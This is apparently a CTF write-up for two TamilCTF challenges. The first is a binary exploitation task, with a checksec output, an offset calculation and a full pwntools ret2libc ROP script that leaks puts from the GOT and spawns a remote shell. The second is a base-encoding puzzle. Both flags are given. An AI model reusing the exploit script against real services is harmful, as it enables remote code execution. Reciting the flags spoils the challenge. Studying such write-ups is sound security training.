# TamilCTF

# NAME SEVER 214 Points ,58 solves


## Checksec Output
```bash
╭─ ~/Desktop/Tamilctf/nameserver/nameserver │ sam0x@parrot                                                                                                                                 ✔ 
╰─ checksec name-serv 
[*] '/home/sam0x/Desktop/Tamilctf/nameserver/nameserver/name-serv'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



## Analysing the binary on Ghidra



![screenshot](https://github.com/shyam0904a/TamilCTF/blob/master/Pasted%20image%2020210930131942.png)

#### There is no input bound checking 
#### NX is enabled so no shellcoding
#### We can use basic ROP chaining attack to exploit this

## Exploiting

#### TO FIND / CONSTRAINS
           
The lic version is unknown 
			
*since we  know it's a 64 bit binary we just cant directly modify the rsp *
*We cant overwrite RSP with 8 byte value , only 6 Bytes can be used else we get general protextion error * (Canonical and non canonical address comes to play )*
#### Using GEF & finding offset

![screenshot](https://github.com/shyam0904a/TamilCTF/blob/master/Pasted%20image%2020210930134637.png)



*we overflow the rbp after 32 bytes *
*so to overwrite the rsp we neet to overwrite rbp +6 *
*i.e we overflow rbp after 32 bytes then the rbp value to rsp value*
*offset = 40*

## The exploitation part



      from pwn import *

      offset = b'A'*40

      ##pwntools context

      context.update(arch='amd64', os='linux')
      p=remote('3.97.113.25', 9001)
      # p=process('name_server_patched')
      elf=ELF('./name-serv',False)
      rop=ROP(elf)



      ##leaking GOT address
      puts_plt=elf.plt['puts']
      puts_got=elf.got['puts']
      main_plt=elf.symbols['main']
      pop_rdi= (rop.find_gadget(['pop rdi', 'ret']))[0]
      ret= (rop.find_gadget(['ret']))[0]


      payload = offset +p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_plt) 

      p.recvuntil(b':')
      p.sendline(payload)
      recieved = p.recvline().strip()

      # Parse leaked address

      log.info(f"Len rop1: {len(payload)}")
      leak = u64(recieved.ljust(8, b"\x00"))
      log.info("libc address of puts :" + hex(leak))

      ##setting up libc base

      libc=ELF('libc6_2.31-0ubuntu9_amd64.so')
      libc.address = leak - libc.symbols['puts'] #Save libc base
      log.info("libc base @ %s" % hex(libc.address))


      ##Systm(/bin/sh)Payload

      bin_sh = next(libc.search(b"/bin/sh\x00"))
      system=libc.symbols['system']

      log.info("Bin/sh :" + (hex(bin_sh)))
      log.info("System :" + (hex(system)))


      def generate_payload_aligned(ropp):
        payload1 = offset + ropp
          if (len(payload1) % 16) == 0:
          return payload1

          else:
               payload2 = offset + p64(ret) + ropp

           if (len(payload2) % 16) == 0:
                   log.info("Payload aligned successfully")
                   return payload2
               else:
                   log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
                   return payload1

      payload2= offset + p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)

      log.info("length of payload2 is "  + str(len(payload2)))
      print(p.recvuntil(b':'))
      p.sendline(payload2)
      p.interactive()


*WE GET THE FLAG *
## TamilCTF{ReT_1s_M0rE_p0wErFu1_a5_LIBC}





# Bases 485 Points ,22 solves

***We are give a file encoded in some randome gibrish***
```bash
╭─ ~/Desktop/Tamilctf/bases │ sam0x@parrot                                                                                                                                                 ✔ 
╰─ cat file.txt 
噯缾𔔸𠅻診噩ꔻꕳ𔔯煐鸩𠅙欫葦葔踥慚灩ꉊ蠫噰噷葌鹀𓈻𖤨𐘱𔑬訮桷陦ꄷ橪鰨𔔫ꉕ蔥𖠻𖡻詓败捄堲絠浩怦𔑢蝂潣縨𓌩蹗襠ꅮ洱𒀰萵饌鍟𒀲橒昻萳靓𔕧罀ᕣ
```

***After a bit of researching and previous ctf ideas found out that this  is a base65536 encoded file***

-BASE65536 as per records:-
- Base65536 is a binary encoding optimised for UTF-32-encoded text. (For transmitting data through Twitter, Base65536 is now considered obsolete; see 		
- Base2048.) This JavaScript module, base65536, is the first implementation of this encoding.
- Base65536 uses only "safe" Unicode code points - no unassigned code points, no whitespace, no control characters, etc..
	
## To deocde the base65536 we first convert it into a unicode using npm module of base65536
```javascript
import { encode, decode } from 'base65536'
import fs from 'fs'

var  data=fs.readFileSync('file.txt').toString('utf-8')
var decoded = new Uint8Array(decode(data))

fs.writeFileSync('out',decoded)
```
__This gives us a decoded output : 26p0EtovXlssmYqbk1UON3JCIFVyYW3V3culA1cJ0AJ8mHvzgWbefttYEpfYlcpt9nh3oZiaWI24d0jzcxBOdq0Ybes3EKUw7GEEfLYM0qpp___
- This doesnt look like any known base encodings 
- After a bit of googling found out that this is a base91 encoded value

Fun thing ***Found a github repo that finds and deocdes the known basex values***

[Github](https://github.com/mufeedvh/basecrack)
	
**After that thats a matter of multiple times of decoding**
- The order goes like BASE65535->BASE91->BASE62->BASE32->ASCII85->FLAG
***FLAG***
## TamilCTF{B4s3_C1ph3r_4r3_re4lly_c00l!!}
